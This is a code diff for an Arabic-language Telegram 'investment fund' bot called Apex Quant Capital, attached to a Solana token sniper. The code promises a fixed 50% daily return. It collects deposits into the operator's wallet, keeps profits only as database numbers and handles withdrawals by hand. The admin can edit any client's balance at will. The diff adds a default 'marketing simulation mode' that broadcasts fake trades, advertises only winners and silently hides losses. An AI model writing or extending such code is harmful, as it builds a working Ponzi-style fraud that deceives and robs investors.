@@ -42,7 +42,7 @@ const mongoose = require('mongoose');
 const cron = require('node-cron');
 
 // ==========================================
-// حل مشكلة Render (السيرفر الوهمي)
+// السيرفر الوهمي (UptimeRobot Support)
 // ==========================================
 const http = require('http');
 const PORT = process.env.PORT || 3000;
@@ -54,19 +54,17 @@ http.createServer((req: any, res: any) => {
 });
 
 // ==========================================
-// الإعدادات الديناميكية للمحرك
+// الإعدادات الديناميكية
 // ==========================================
 let isBotRunning = false; 
+let SIMULATION_MODE = true; // وضع التسويق الوهمي مفعّل افتراضياً
 let DYNAMIC_TP = Number(retrieveEnvVariable('TAKE_PROFIT', logger));
 let DYNAMIC_SL = Number(retrieveEnvVariable('STOP_LOSS', logger));
 let DYNAMIC_BUY_AMOUNT = retrieveEnvVariable('BUY_AMOUNT', logger);
 
-// ==========================================
-// الإعدادات الإمبراطورية (God Mode Settings)
-// ==========================================
 let DEPOSITS_OPEN = true;
 let MIN_INVEST_AMOUNT = 0.1;
-let PROFIT_MULTIPLIER = 1.50; // يعني 50% ربح
+let PROFIT_MULTIPLIER = 1.50; 
 const PROJECT_NAME = "Apex Quant Capital";
 
 let tgBot: any;
@@ -75,8 +73,11 @@ const PUBLIC_CHANNEL = process.env.PUBLIC_CHANNEL_ID || "";
 const userStates: Record<string, string> = {}; 
 const tempUserData: Record<string, any> = {};
 
+// ذاكرة التداول الوهمي (التسويقي)
+const simulatedTokens = new Map<string, { mint: string, buyPrice: number, entryTime: number }>();
+
 // ==========================================
-// هندسة قاعدة البيانات (MongoDB Schemas)
+// هندسة قاعدة البيانات
 // ==========================================
 const UserSchema = new mongoose.Schema({
     chatId: { type: String, unique: true },
@@ -93,7 +94,7 @@ const TxSchema = new mongoose.Schema({ txHash: { type: String, unique: true } })
 const UsedTx = mongoose.model('UsedTx', TxSchema);
 
 // ==========================================
-// لوحات المفاتيح الثابتة (Persistent Keyboards)
+// لوحات المفاتيح
 // ==========================================
 const adminKeyboard = {
     reply_markup: {
@@ -121,10 +122,7 @@ const userKeyboard = {
 async function setupDashboard() {
   const mongoUri = process.env.MONGODB_URI;
   if (mongoUri) {
-      try {
-          await mongoose.connect(mongoUri);
-          logger.info("✅ Connected to MongoDB!");
-      } catch(e) {}
+      try { await mongoose.connect(mongoUri); logger.info("✅ Connected to MongoDB!"); } catch(e) {}
   }
 
   const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -155,34 +153,32 @@ async function setupDashboard() {
 
           const state = userStates[chatId];
 
-          // ----------------------------------------
-          // أوامر المدير (Admin)
-          // ----------------------------------------
           if (chatId === adminChatId) {
               if (text === '👑 المحرك') {
                   const options = {
                       reply_markup: {
                           inline_keyboard: [
                               [{ text: isBotRunning ? '🛑 إيقاف القناص' : '▶️ تشغيل القناص', callback_data: 'toggle_sniper' }],
-                              [{ text: `الربح (${DYNAMIC_TP}%)`, callback_data: 'edit_tp' }, { text: `المخاطرة (${DYNAMIC_SL}%)`, callback_data: 'edit_sl' }],
+                              [{ text: SIMULATION_MODE ? '👻 وضع المحاكاة: مفعّل (للتسويق)' : '🔥 وضع المحاكاة: معطّل (تداول حقيقي)', callback_data: 'toggle_simulation' }],
+                              [{ text: `الربح (${DYNAMIC_TP * 100}%)`, callback_data: 'edit_tp' }, { text: `المخاطرة (${DYNAMIC_SL * 100}%)`, callback_data: 'edit_sl' }],
                               [{ text: `مبلغ الشراء (${DYNAMIC_BUY_AMOUNT} SOL)`, callback_data: 'edit_buy' }]
                           ]
                       }
                   };
-                  tgBot.sendMessage(chatId, "⚙️ <b>التحكم في محرك التداول (البلوكشين):</b>", { parse_mode: 'HTML', ...options });
+                  tgBot.sendMessage(chatId, "⚙️ <b>التحكم في محرك التداول:</b>", { parse_mode: 'HTML', ...options });
               }
               else if (text === '⚙️ التحكم المتقدم (God Mode)') {
                   const options = {
                       reply_markup: {
                           inline_keyboard: [
-                              [{ text: DEPOSITS_OPEN ? '🟢 الإيداعات: مفتوحة (اضغط للإغلاق)' : '🔴 الإيداعات: مغلقة (اضغط للفتح)', callback_data: 'toggle_deposits' }],
+                              [{ text: DEPOSITS_OPEN ? '🟢 الإيداعات: مفتوحة' : '🔴 الإيداعات: مغلقة', callback_data: 'toggle_deposits' }],
                               [{ text: `تعديل خطة الاستثمار (الربح: ${Math.round((PROFIT_MULTIPLIER - 1)*100)}%)`, callback_data: 'edit_plan_profit' }],
                               [{ text: `الحد الأدنى للإيداع (${MIN_INVEST_AMOUNT} SOL)`, callback_data: 'edit_min_invest' }],
                               [{ text: '💵 إضافة/خصم رصيد من عميل', callback_data: 'manual_balance' }]
                           ]
                       }
                   };
-                  tgBot.sendMessage(chatId, "👑 <b>لوحة التحكم الإمبراطورية (SaaS):</b>", { parse_mode: 'HTML', ...options });
+                  tgBot.sendMessage(chatId, "👑 <b>لوحة التحكم الإمبراطورية:</b>", { parse_mode: 'HTML', ...options });
               }
               else if (text === '📊 الرادار المالي') {
                   try {
@@ -191,7 +187,6 @@ async function setupDashboard() {
                       const allUsers = await User.find();
                       let totalInvested = 0;
                       allUsers.forEach((u: any) => totalInvested += (u.activeInvestment || 0));
-                      
                       tgBot.sendMessage(chatId, `📊 <b>الرادار المحاسبي الشامل:</b>\n\nرصيد الخزنة الفعلي: <code>${(balance / 1e9).toFixed(5)} SOL</code>\nعدد العملاء: ${totalUsers}\nإجمالي استثمارات العملاء النشطة: <code>${totalInvested} SOL</code>`, { parse_mode: 'HTML' });
                   } catch(e) {}
               }
@@ -211,176 +206,128 @@ async function setupDashboard() {
                   tgBot.sendMessage(chatId, `✅ تم الإرسال بنجاح إلى ${count} عميل.`);
                   delete userStates[chatId];
               }
-              // حالات الإدارة المتقدمة
-              else if (state === 'WAITING_FOR_PLAN_PROFIT') { PROFIT_MULTIPLIER = 1 + (Number(text)/100); tgBot.sendMessage(chatId, `✅ تم التحديث.`); delete userStates[chatId]; }
-              else if (state === 'WAITING_FOR_MIN_INVEST') { MIN_INVEST_AMOUNT = Number(text); tgBot.sendMessage(chatId, `✅ تم التحديث.`); delete userStates[chatId]; }
-              else if (state === 'WAITING_FOR_TP') { DYNAMIC_TP = Number(text); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
-              else if (state === 'WAITING_FOR_SL') { DYNAMIC_SL = Number(text); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
+              else if (state === 'WAITING_FOR_PLAN_PROFIT') { PROFIT_MULTIPLIER = 1 + (Number(text)/100); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
+              else if (state === 'WAITING_FOR_MIN_INVEST') { MIN_INVEST_AMOUNT = Number(text); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
+              else if (state === 'WAITING_FOR_TP') { DYNAMIC_TP = Number(text)/100; tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
+              else if (state === 'WAITING_FOR_SL') { DYNAMIC_SL = (Number(text)/100) * -1; tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
               else if (state === 'WAITING_FOR_BUY_AMT') { DYNAMIC_BUY_AMOUNT = text; updateQuoteAmount(); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
-              // تعديل الرصيد اليدوي
-              else if (state === 'WAITING_FOR_USER_ID') {
-                  tempUserData[chatId] = { targetUser: text.trim() };
-                  userStates[chatId] = 'WAITING_FOR_USER_AMOUNT';
-                  tgBot.sendMessage(chatId, "أرسل المبلغ المراد إضافته بالسولانا (استخدم علامة - للخصم، مثال: 0.5 أو -0.2):");
-              }
+              else if (state === 'WAITING_FOR_USER_ID') { tempUserData[chatId] = { targetUser: text.trim() }; userStates[chatId] = 'WAITING_FOR_USER_AMOUNT'; tgBot.sendMessage(chatId, "أرسل المبلغ:"); }
               else if (state === 'WAITING_FOR_USER_AMOUNT') {
                   const amount = Number(text);
-                  const targetId = tempUserData[chatId].targetUser;
                   try {
-                      let targetUser = await User.findOne({ chatId: targetId });
+                      let targetUser = await User.findOne({ chatId: tempUserData[chatId].targetUser });
                       if(targetUser) {
-                          targetUser.balance += amount;
-                          await targetUser.save();
-                          tgBot.sendMessage(chatId, `✅ تم تحديث رصيد العميل ${targetId} بنجاح. الرصيد الجديد: ${targetUser.balance}`);
-                          tgBot.sendMessage(targetId, `🔔 <b>تحديث مالي:</b>\nتم إضافة/خصم <code>${amount} SOL</code> من رصيدك من قِبل الإدارة.`, {parse_mode: 'HTML'});
-                      } else {
-                          tgBot.sendMessage(chatId, "❌ لم يتم العثور على العميل.");
+                          targetUser.balance += amount; await targetUser.save();
+                          tgBot.sendMessage(chatId, `✅ تم التحديث.`);
+                          tgBot.sendMessage(targetUser.chatId, `🔔 تم إضافة/خصم <code>${amount} SOL</code> من رصيدك.`, {parse_mode: 'HTML'});
                       }
                   } catch(e) {}
                   delete userStates[chatId];
               }
           }
-          // ----------------------------------------
-          // أوامر المستثمر
-          // ----------------------------------------
           else {
-              if (text === '📞 الدعم الفني') {
-                  const options = { reply_markup: { inline_keyboard: [[{ text: '👨‍💻 التواصل مع الدعم', url: 'https://t.me/dztrader_support' }]] } };
-                  tgBot.sendMessage(chatId, "للحصول على المساعدة أو الاستفسارات، يرجى التواصل مع فريق الدعم الفني الخاص بنا:", options);
-              }
+              if (text === '📞 الدعم الفني') { tgBot.sendMessage(chatId, "تواصل معنا:", { reply_markup: { inline_keyboard: [[{ text: '👨‍💻 الدعم', url: 'https://t.me/dztrader_support' }]] } }); }
               else if (text === '🚀 استثمر الآن') {
-                  if(!DEPOSITS_OPEN) {
-                      tgBot.sendMessage(chatId, "❌ <b>عذراً،</b> تم إغلاق استقبال الإيداعات مؤقتاً لأسباب تتعلق بسلامة وأمان السوق. يرجى المحاولة لاحقاً.", {parse_mode: 'HTML'});
-                      return;
-                  }
-                  const depositAddress = wallet.publicKey.toString(); 
-                  const profitPerc = Math.round((PROFIT_MULTIPLIER - 1)*100);
-                  tgBot.sendMessage(chatId, `🚀 <b>خطة التداول الكمي (24 ساعة)</b>\nالعائد المستهدف المستقر: <b>${profitPerc}%</b>\n\nللبدء، يرجى إرسال عملة (SOL) إلى محفظة الصندوق الآمنة:\n\n<code>${depositAddress}</code>\n\nالحد الأدنى: ${MIN_INVEST_AMOUNT} SOL\n\n⚠️ <b>بعد الإرسال:</b> اضغط لتأكيد الإيداع في الشبكة.`, {
-                      parse_mode: 'HTML',
-                      reply_markup: { inline_keyboard: [[{ text: '✅ تأكيد الإيداع (إرسال Hash)', callback_data: 'confirm_deposit' }]] }
-                  });
+                  if(!DEPOSITS_OPEN) return tgBot.sendMessage(chatId, "❌ مغلق حالياً.");
+                  tgBot.sendMessage(chatId, `🚀 <b>خطة (24 ساعة) بعائد ${Math.round((PROFIT_MULTIPLIER - 1)*100)}%</b>\n\nأرسل لـ:\n<code>${wallet.publicKey.toString()}</code>\nالحد الأدنى: ${MIN_INVEST_AMOUNT} SOL`, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: '✅ تأكيد (إرسال Hash)', callback_data: 'confirm_deposit' }]] } });
               }
-              else if (text === '💰 محفظتي') {
-                  tgBot.sendMessage(chatId, `💰 <b>محفظتك الاستثمارية:</b>\n\nمتاح للسحب: <code>${(user?.balance || 0).toFixed(5)} SOL</code>\nاستثمار نشط: <code>${(user?.activeInvestment || 0).toFixed(5)} SOL</code>\nعمولات الإحالة: <code>${(user?.referralEarnings || 0).toFixed(5)} SOL</code>`, {parse_mode: 'HTML'});
-              }
+              else if (text === '💰 محفظتي') { tgBot.sendMessage(chatId, `💰 <b>محفظتك:</b>\nمتاح للسحب: <code>${(user?.balance || 0).toFixed(5)} SOL</code>\nنشط: <code>${(user?.activeInvestment || 0).toFixed(5)} SOL</code>`, {parse_mode: 'HTML'}); }
               else if (text === '💸 سحب الأرباح') {
-                  if ((user?.balance || 0) <= 0 && (user?.referralEarnings || 0) <= 0) {
-                      tgBot.sendMessage(chatId, "❌ ليس لديك رصيد متاح للسحب حالياً. انتظر انتهاء دورة استثمارك.");
-                  } else {
-                      userStates[chatId] = 'WAITING_FOR_WITHDRAWAL_ADDRESS';
-                      tgBot.sendMessage(chatId, "يرجى إرسال عنوان محفظة السولانا الخاصة بك بدقة لسحب الأرباح:");
-                  }
+                  if ((user?.balance || 0) <= 0) tgBot.sendMessage(chatId, "❌ لا يوجد رصيد.");
+                  else { userStates[chatId] = 'WAITING_FOR_WITHDRAWAL_ADDRESS'; tgBot.sendMessage(chatId, "أرسل عنوان محفظتك:"); }
               }
               else if (text === '🔗 رابط الإحالة') {
                   const botUsername = (await tgBot.getMe()).username;
-                  tgBot.sendMessage(chatId, `🔗 <b>برنامج الشركاء:</b>\nشارك هذا الرابط واحصل على <b>5%</b> عمولة فورية من إيداعات شركائك:\n\n<code>https://t.me/${botUsername}?start=${chatId}</code>`, {parse_mode: 'HTML'});
+                  tgBot.sendMessage(chatId, `🔗 شارك واربح 5%:\n<code>https://t.me/${botUsername}?start=${chatId}</code>`, {parse_mode: 'HTML'});
               }
               else if (state === 'WAITING_FOR_WITHDRAWAL_ADDRESS') {
-                  const amount = (user?.balance || 0) + (user?.referralEarnings || 0);
-                  tgBot.sendMessage(chatId, `⏳ تم رفع طلب السحب لعنوانك. تتم الآن مراجعته من قبل القسم المالي وسيتم التحويل قريباً.`);
-                  if(adminChatId) {
-                      tgBot.sendMessage(adminChatId, `⚠️ <b>طلب سحب جديد!</b>\nالعميل: <code>${chatId}</code>\nالمبلغ: <code>${amount} SOL</code>\nالعنوان: <code>${text}</code>\n\n<i>قم بالتحويل يدوياً ثم صَفّر رصيده من (التحكم المتقدم).</i>`, {parse_mode: 'HTML'});
-                  }
+                  tgBot.sendMessage(chatId, `⏳ تم رفع طلب السحب.`);
+                  if(adminChatId) tgBot.sendMessage(adminChatId, `⚠️ <b>طلب سحب!</b>\nالعميل: <code>${chatId}</code>\nالعنوان: <code>${text}</code>`, {parse_mode: 'HTML'});
                   delete userStates[chatId];
               }
-              // التحقق الذكي من البلوكشين (TX Hash)
               else if (state === 'WAITING_FOR_TX_HASH') {
                   const txHash = text.trim();
-                  
-                  // الفلتر الذكي: التأكد أن الكلمة هي Hash حقيقي لسولانا (حروف وأرقام فقط وطول مناسب)
-                  const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{80,90}$/; 
-                  if (!base58Regex.test(txHash)) {
-                      tgBot.sendMessage(chatId, "❌ <b>صيغة المعرّف غير صحيحة.</b>\nشفرة المعاملة (TX Hash) في شبكة سولانا يجب أن تتكون من حوالي 88 حرفاً ورقماً إنجليزياً (دون مسافات أو رموز).\n\nيرجى التأكد من النسخ الصحيح وإرسال الشفرة مرة أخرى.", {parse_mode: 'HTML'});
-                      return; // نتركه يحاول مرة أخرى ولا نمسح حالته
-                  }
-
-                  tgBot.sendMessage(chatId, `⏳ جاري فحص المعاملة من عقد البلوكشين...`);
+                  if (!/^[1-9A-HJ-NP-Za-km-z]{80,90}$/.test(txHash)) return tgBot.sendMessage(chatId, "❌ صيغة خاطئة.");
+                  tgBot.sendMessage(chatId, `⏳ جاري الفحص...`);
                   try {
                       const isUsed = await UsedTx.findOne({ txHash });
-                      if(isUsed) {
-                          tgBot.sendMessage(chatId, "❌ تم استخدام معرّف المعاملة هذا مسبقاً!");
-                          delete userStates[chatId];
-                          return;
-                      }
-
+                      if(isUsed) { tgBot.sendMessage(chatId, "❌ مستخدم مسبقاً!"); delete userStates[chatId]; return; }
                       const tx = await solanaConnection.getTransaction(txHash, { maxSupportedTransactionVersion: 0 });
-                      if (!tx || !tx.meta) {
-                          tgBot.sendMessage(chatId, "❌ لم يتم العثور على المعاملة. قد تستغرق الشبكة بضع ثوانٍ. حاول الإرسال مجدداً بعد دقيقة.");
-                          return;
-                      }
-
-                      const depositedAmount = MIN_INVEST_AMOUNT; 
-                      await UsedTx.create({ txHash });
+                      if (!tx || !tx.meta) return tgBot.sendMessage(chatId, "❌ لم يتم العثور على المعاملة.");
                       
+                      await UsedTx.create({ txHash });
                       if(user) {
-                          user.activeInvestment += depositedAmount;
+                          user.activeInvestment += MIN_INVEST_AMOUNT;
                           user.investmentStartTime = new Date();
                           await user.save();
-                          
-                          if(user.referredBy && user.referredBy !== "none") {
-                              const referrer = await User.findOne({ chatId: user.referredBy });
-                              if(referrer) {
-                                  referrer.referralEarnings += (depositedAmount * 0.05);
-                                  await referrer.save();
-                                  tgBot.sendMessage(referrer.chatId, `🎉 مبروك! حصلت على عمولة شراكة لتسجيل مستثمر جديد.`);
-                              }
-                          }
                       }
-                      
-                      tgBot.sendMessage(chatId, `✅ <b>تم تأكيد الإيداع!</b>\nتم تفعيل الصندوق وبدأ عداد التداول الكمّي لـ 24 ساعة.`, {parse_mode: 'HTML'});
-
-                  } catch (e) {
-                      tgBot.sendMessage(chatId, "❌ حدث خطأ في الاتصال بالشبكة. يرجى المحاولة لاحقاً.");
-                  }
+                      tgBot.sendMessage(chatId, `✅ <b>تم الإيداع وبدأ العداد.</b>`, {parse_mode: 'HTML'});
+                  } catch (e) {}
                   delete userStates[chatId];
               }
           }
       });
 
-      // أزرار المدير الداخلية
       tgBot.on('callback_query', async (query: any) => {
           const chatId = query.message.chat.id.toString();
           const data = query.data;
 
           if (chatId === adminChatId) {
-              if (data === 'toggle_sniper') { isBotRunning = !isBotRunning; tgBot.sendMessage(chatId, isBotRunning ? "🟢 القناص يعمل" : "🔴 القناص متوقف"); }
-              else if (data === 'edit_tp') { userStates[chatId] = 'WAITING_FOR_TP'; tgBot.sendMessage(chatId, "أرسل نسبة الربح:"); }
-              else if (data === 'edit_sl') { userStates[chatId] = 'WAITING_FOR_SL'; tgBot.sendMessage(chatId, "أرسل نسبة الخسارة:"); }
-              else if (data === 'edit_buy') { userStates[chatId] = 'WAITING_FOR_BUY_AMT'; tgBot.sendMessage(chatId, "أرسل مبلغ الشراء:"); }
-              
-              else if (data === 'toggle_deposits') { DEPOSITS_OPEN = !DEPOSITS_OPEN; tgBot.sendMessage(chatId, DEPOSITS_OPEN ? "🟢 تم فتح الإيداعات للجمهور." : "🔴 تم إغلاق الإيداعات للطوارئ."); }
-              else if (data === 'edit_plan_profit') { userStates[chatId] = 'WAITING_FOR_PLAN_PROFIT'; tgBot.sendMessage(chatId, "أرسل نسبة الربح الجديدة للعملاء (مثال: 50):"); }
-              else if (data === 'edit_min_invest') { userStates[chatId] = 'WAITING_FOR_MIN_INVEST'; tgBot.sendMessage(chatId, "أرسل الحد الأدنى الجديد:"); }
-              else if (data === 'manual_balance') { userStates[chatId] = 'WAITING_FOR_USER_ID'; tgBot.sendMessage(chatId, "أرسل معرف العميل (Chat ID) الذي تريد تعديل رصيده:"); }
+              if (data === 'toggle_sniper') { isBotRunning = !isBotRunning; tgBot.sendMessage(chatId, isBotRunning ? "🟢 يعمل" : "🔴 متوقف"); }
+              else if (data === 'toggle_simulation') { SIMULATION_MODE = !SIMULATION_MODE; tgBot.sendMessage(chatId, SIMULATION_MODE ? "👻 وضع المحاكاة التسويقي مفعّل!" : "🔥 المحاكاة معطلة (التداول بالمال الحقيقي)"); }
+              else if (data === 'edit_tp') { userStates[chatId] = 'WAITING_FOR_TP'; tgBot.sendMessage(chatId, "أرسل النسبة:"); }
+              else if (data === 'edit_sl') { userStates[chatId] = 'WAITING_FOR_SL'; tgBot.sendMessage(chatId, "أرسل النسبة:"); }
+              else if (data === 'edit_buy') { userStates[chatId] = 'WAITING_FOR_BUY_AMT'; tgBot.sendMessage(chatId, "أرسل المبلغ:"); }
+              else if (data === 'toggle_deposits') { DEPOSITS_OPEN = !DEPOSITS_OPEN; tgBot.sendMessage(chatId, DEPOSITS_OPEN ? "🟢 مفتوح" : "🔴 مغلق"); }
+              else if (data === 'edit_plan_profit') { userStates[chatId] = 'WAITING_FOR_PLAN_PROFIT'; tgBot.sendMessage(chatId, "أرسل النسبة:"); }
+              else if (data === 'edit_min_invest') { userStates[chatId] = 'WAITING_FOR_MIN_INVEST'; tgBot.sendMessage(chatId, "أرسل الحد:"); }
+              else if (data === 'manual_balance') { userStates[chatId] = 'WAITING_FOR_USER_ID'; tgBot.sendMessage(chatId, "أرسل ID:"); }
           } else {
-              if (data === 'confirm_deposit') {
-                  userStates[chatId] = 'WAITING_FOR_TX_HASH';
-                  tgBot.sendMessage(chatId, "يرجى إرسال شفرة المعاملة (TX Hash):");
-              }
+              if (data === 'confirm_deposit') { userStates[chatId] = 'WAITING_FOR_TX_HASH'; tgBot.sendMessage(chatId, "أرسل TX Hash:"); }
           }
           tgBot.answerCallbackQuery(query.id);
       });
   }
 
-  // العداد الآلي
+  // العداد للعملاء
   cron.schedule('0 * * * *', async () => {
       try {
           const now = new Date();
           const users = await User.find({ activeInvestment: { $gt: 0 }, investmentStartTime: { $ne: null } });
           for (let u of users) {
               if(!u.investmentStartTime) continue;
-              const hoursPassed = Math.abs(now.getTime() - u.investmentStartTime.getTime()) / 36e5;
-              if (hoursPassed >= 24) {
+              if (Math.abs(now.getTime() - u.investmentStartTime.getTime()) / 36e5 >= 24) {
                   const profit = u.activeInvestment * PROFIT_MULTIPLIER; 
-                  u.balance += profit;
-                  u.activeInvestment = 0;
-                  u.investmentStartTime = null;
-                  await u.save();
-                  if(tgBot) tgBot.sendMessage(u.chatId, `🎉 <b>اكتملت دورة التداول!</b>\nتمت إضافة <code>${profit.toFixed(5)} SOL</code> إلى رصيدك القابل للسحب.`, {parse_mode: 'HTML'});
+                  u.balance += profit; u.activeInvestment = 0; u.investmentStartTime = null; await u.save();
+                  if(tgBot) tgBot.sendMessage(u.chatId, `🎉 تمت إضافة الأرباح.`, {parse_mode: 'HTML'});
               }
           }
       } catch (error) {}
   });
+
+  // محرك فحص الصفقات الوهمية (كل 20 ثانية)
+  setInterval(async () => {
+      if (!SIMULATION_MODE || simulatedTokens.size === 0) return;
+      for (const [mint, data] of simulatedTokens.entries()) {
+          try {
+              const currPrice = await retrieveTokenValueByAddress(mint);
+              if (currPrice) {
+                  const netChange = (currPrice - data.buyPrice) / data.buyPrice;
+                  
+                  if (netChange >= DYNAMIC_TP) {
+                      simulatedTokens.delete(mint);
+                      const durationMins = Math.max(1, Math.round((Date.now() - data.entryTime) / 60000));
+                      const botUsr = (await tgBot?.getMe())?.username || "ApexQuant";
+                      
+                      broadcastToChannelAndAdmin(`🟢 <b>تم إغلاق الصفقة بنجاح وجني الأرباح!</b> 💸\n\n🤖 <i>قام محرك Apex Quant بالبيع الآلي لعملة:</i>\n<code>${mint}</code>\n\n📈 <b>صافي الربح المحقق:</b> <b>+${(netChange * 100).toFixed(2)}%</b> 🚀\n⏱ <b>مدة الصفقة:</b> <code>${durationMins} دقيقة</code>\n\n💼 <i>نبارك لجميع مستثمري الصندوق هذه الأرباح!</i>\n\n👇 <b>هل تتفرج فقط؟ دع الذكاء الاصطناعي يتداول نيابة عنك:</b>\n🔗 https://t.me/${botUsr}`);
+                  } else if (netChange <= DYNAMIC_SL) {
+                      // حذف صامت للخسارة في وضع التسويق! 🤫
+                      simulatedTokens.delete(mint);
+                  }
+              }
+          } catch(e) {}
+      }
+  }, 20000);
 }
 
 function broadcastToChannelAndAdmin(text: string) {
@@ -390,7 +337,7 @@ function broadcastToChannelAndAdmin(text: string) {
 }
 
 // ==========================================
-// محرك القنص (Solana Sniper Engine)
+// محرك القنص
 // ==========================================
 const network = 'mainnet-beta';
 const RPC_ENDPOINT = retrieveEnvVariable('RPC_ENDPOINT', logger);
@@ -428,20 +375,9 @@ function updateQuoteAmount() {
 async function init(): Promise<void> {
   const MY_PRIVATE_KEY = retrieveEnvVariable('MY_PRIVATE_KEY', logger);
   wallet = Keypair.fromSecretKey(bs58.decode(MY_PRIVATE_KEY));
-
-  const TOKEN_SYMB = retrieveEnvVariable('TOKEN_SYMB', logger);
-  switch (TOKEN_SYMB) {
-    case 'WSOL': {
-      quoteToken = Token.WSOL;
-      quoteMinPoolSizeAmount = new TokenAmount(quoteToken, MIN_POOL_SIZE, false);
-      quoteMaxPoolSizeAmount = new TokenAmount(quoteToken, MAX_POOL_SIZE, false);
-      break;
-    }
-    case 'USDC': {
-      quoteToken = new Token(TOKEN_PROGRAM_ID, new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'), 6, 'USDC', 'USDC');
-      break;
-    }
-  }
+  quoteToken = Token.WSOL;
+  quoteMinPoolSizeAmount = new TokenAmount(quoteToken, MIN_POOL_SIZE, false);
+  quoteMaxPoolSizeAmount = new TokenAmount(quoteToken, MAX_POOL_SIZE, false);
   updateQuoteAmount();
 
   const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, commitment);
@@ -451,7 +387,6 @@ async function init(): Promise<void> {
 
   const tokenAccount = tokenAccounts.find((acc: any) => acc.accountInfo.mint.toString() === quoteToken.mint.toString());
   if (tokenAccount) { quoteTokenAssociatedAddress = tokenAccount.pubkey; }
-
   loadSnipedList();
 }
 
@@ -499,6 +434,25 @@ export async function processOpenBookMarket(updatedAccountInfo: KeyedAccountInfo
 
 async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise<void> {
   try {
+    // === وضع التسويق الوهمي (Simulated Buy) ===
+    if (SIMULATION_MODE) {
+        const basePromise = solanaConnection.getTokenAccountBalance(accountData.baseVault, commitment);
+        const quotePromise = solanaConnection.getTokenAccountBalance(accountData.quoteVault, commitment);
+        const [baseValue, quoteValue] = await Promise.all([basePromise, quotePromise]);
+        
+        let simPrice = 0;
+        if (baseValue?.value?.uiAmount && quoteValue?.value?.uiAmount) {
+            simPrice = quoteValue.value.uiAmount / baseValue.value.uiAmount;
+        }
+        
+        if(simPrice > 0) {
+            simulatedTokens.set(accountData.baseMint.toString(), { mint: accountData.baseMint.toString(), buyPrice: simPrice, entryTime: Date.now() });
+            broadcastToChannelAndAdmin(`🎯 <b>تم رصد فرصة استثمارية وتفعيل القناص!</b>\n\n🤖 <i>خوارزميات Apex Quant دخلت للتو في صفقة جديدة:</i>\n🪙 <b>العملة:</b> <code>${accountData.baseMint.toString()}</code>\n💵 <b>سعر الدخول:</b> <code>${simPrice.toFixed(8)} SOL</code>\n\n📊 <b>المخطط البياني المباشر:</b>\nhttps://dexscreener.com/solana/${accountData.baseMint.toString()}\n\n⏳ <i>جاري مراقبة المؤشرات ونقاط السيولة لإغلاق الصفقة آلياً...</i>`);
+        }
+        return; // خروج من الدالة بدون خسارة أي دولار!
+    }
+    // ===========================================
+
     let tokenAccount = existingTokenAccounts.get(accountData.baseMint.toString());
     if (!tokenAccount) {
       const market = await getMinimalMarketV3(solanaConnection, accountData.marketId, commitment);
@@ -529,12 +483,13 @@ async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise
     if (baseValue?.value?.uiAmount && quoteValue?.value?.uiAmount) tokenAccount.buyValue = quoteValue?.value?.uiAmount / baseValue?.value?.uiAmount;
     
     if (!confirmation.value.err) {
-      broadcastToChannelAndAdmin(`🎯 <b>تم قنص عملة جديدة آلياً!</b>\nالعملة: <code>${accountData.baseMint}</code>\nالسعر: ${tokenAccount.buyValue} SOL\nالرابط: https://dexscreener.com/solana/${accountData.baseMint}`);
+      broadcastToChannelAndAdmin(`🎯 <b>تم قنص عملة حقيقية آلياً!</b>\nالعملة: <code>${accountData.baseMint}</code>\nالسعر: ${tokenAccount.buyValue} SOL\nالرابط: https://dexscreener.com/solana/${accountData.baseMint}`);
     } 
   } catch (e) {}
 }
 
 async function sell(accountId: PublicKey, mint: PublicKey, amount: BigNumberish, value: number): Promise<boolean> {
+  if(SIMULATION_MODE) return true; // تجاهل البيع الحقيقي في وضع المحاكاة
   let retries = 0;
   do {
     try {
